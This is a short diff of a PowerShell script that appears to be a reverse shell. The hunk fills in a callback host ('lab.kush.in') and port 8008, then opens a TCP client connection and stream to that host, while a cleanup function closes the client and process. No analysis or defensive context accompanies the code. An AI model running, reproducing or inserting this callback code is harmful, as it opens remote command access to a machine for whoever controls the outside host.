@@ -2,8 +2,8 @@ function cleanup {
 if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
-$address = ''
-$port = ''
+$address = 'lab.kush.in'
+$port = '8008'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
 $stream = $client.GetStream()
